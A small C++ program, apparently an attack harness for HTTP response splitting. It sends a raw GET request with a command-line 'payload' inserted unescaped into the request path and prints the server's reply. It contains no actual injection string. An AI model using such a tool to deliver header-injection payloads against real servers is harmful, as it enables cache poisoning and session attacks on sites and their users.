// Compile: g++ -o http_split http_split.cpp
// Run: ./http_split <host> <port> <payload>
// No special privileges required

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string>

class HTTPSplitter {
private:
    int sock;
    std::string host;
    int port;
    
public:
    HTTPSplitter(const std::string& h, int p) : host(h), port(p) {}
    
    bool connect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        struct hostent* server = gethostbyname(host.c_str());
        if (!server) return false;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
        
        return ::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0;
    }
    
    std::string split(const std::string& payload) {
        std::string request = 
            "GET /" + payload + " HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "\r\n";
        
        send(sock, request.c_str(), request.length(), 0);
        
        char buffer[4096];
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            return std::string(buffer);
        }
        return "";
    }
    
    ~HTTPSplitter() { if (sock >= 0) close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <host> <port> <payload>\n";
        return 1;
    }
    HTTPSplitter splitter(argv[1], atoi(argv[2]));
    if (splitter.connect()) {
        std::cout << splitter.split(argv[3]) << std::endl;
    }
    return 0;
}